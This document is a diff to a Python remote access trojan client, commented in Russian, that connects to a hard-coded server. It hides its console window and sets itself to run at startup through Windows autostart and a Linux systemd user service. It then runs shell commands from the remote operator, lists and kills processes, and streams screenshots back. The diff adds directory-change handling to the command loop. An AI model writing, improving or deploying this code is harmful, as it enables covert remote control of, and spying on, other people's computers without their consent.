@@ -8,9 +8,10 @@ SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
-def execute_command(command):
+def execute_command(command, cwd):
     try:
-        output = subprocess.getoutput(command)
+        # Выполняем команду в указанной директории
+        output = subprocess.getoutput(f"cd \"{cwd}\" && {command}")
         return output
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
@@ -27,7 +28,7 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
-        # Используем pythonw.exe, если есть, чтобы не показывалось окно консоли
+        # Используем pythonw.exe, если существует, чтобы не показывалось окно консоли
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -91,7 +92,7 @@ RestartSec=5
 WantedBy=default.target
 """
 
-    # Если сервис уже есть и не нужно менять — пропускаем
+    # Если сервис уже существует и совпадает, пропускаем
     if os.path.exists(service_path):
         with open(service_path, "r", encoding="utf-8") as f:
             existing = f.read()
@@ -103,16 +104,15 @@ WantedBy=default.target
         with open(service_path, "w", encoding="utf-8") as f:
             f.write(service_content)
     except Exception as e:
-        return False, f"Ошибка записи файла systemd unit: {e}"
+        return False, f"Ошибка записи systemd unit файла: {e}"
 
     # Перезагружаем systemd и включаем сервис
     try:
         subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
         subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
-        # Запускаем сервис, если не запущен
         subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
     except Exception as e:
-        return False, f"Ошибка в systemctl: {e}"
+        return False, f"Ошибка при работе с systemctl: {e}"
 
     return True, f"systemd сервис установлен и запущен: {service_path}"
 
@@ -132,18 +132,18 @@ def add_self_to_autostart():
         if not is_in_autostart_linux():
             success, msg = add_to_autostart_linux()
             print(msg)
-            # Для служб пользователя возможно нужно включить linger:
-            # Подсказка пользователю вручную:
-            print("Если сервис не стартует после перезагрузки, выполните в терминале:")
-            print("sudo loginctl enable-linger $USER")
+            print("Если сервис не стартует после перезагрузки, выполните: sudo loginctl enable-linger $USER")
         else:
             print("Уже добавлен в systemd автозапуск")
 
 def main():
+    # Добавляем себя в автозапуск (если ещё не добавлен)
     try:
         add_self_to_autostart()
     except Exception as e:
         print(f"Ошибка добавления в автозапуск: {e}")
+
+    current_dir = os.getcwd()
 
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -160,46 +160,64 @@ def main():
                     break
                 if data == "exit":
                     break
+
+                # Обработка команды cd
+                if data.startswith("cd "):
+                    path = data[3:].strip()
+                    try:
+                        os.chdir(path)
+                        current_dir = os.getcwd()
+                        s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
+                    except Exception as e:
+                        s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
+                    continue
+
                 if data.startswith("cmd:"):
                     cmd = data[4:]
-                    output = execute_command(cmd)
+                    output = execute_command(cmd, current_dir)
                     s.send(output.encode(errors='ignore'))
+
                 elif data == "process_list":
-                    if os.name == 'nt':
+                    if is_windows():
                         procs = subprocess.getoutput('tasklist')
                     else:
                         procs = subprocess.getoutput('ps aux')
                     s.send(procs.encode(errors='ignore'))
+
                 elif data.startswith("kill:"):
                     pid = data[5:]
                     try:
-                        if os.name == 'nt':
+                        if is_windows():
                             subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                         else:
                             subprocess.check_output(f'kill -9 {pid}', shell=True)
                         s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                     except Exception as e:
                         s.send(f"Ошибка: {e}".encode(errors='ignore'))
+
                 elif data == "screenshot":
                     try:
                         import pyautogui
                         screenshot = pyautogui.screenshot()
                         screenshot.save("screen.jpg")
-                        with open("screen.jpg", "rb") as f:
+                        with open("screen.jpg", "rb") as f_img:
                             while True:
-                                chunk = f.read(BUFFER_SIZE)
+                                chunk = f_img.read(BUFFER_SIZE)
                                 if not chunk:
                                     break
                                 s.sendall(chunk)
                         os.remove("screen.jpg")
                     except Exception as e:
                         s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
+
                 else:
                     s.send("Неизвестная команда".encode(errors='ignore'))
+
         except:
             pass
         finally:
             s.close()
+
         time.sleep(5)
 
 if __name__ == "__main__":
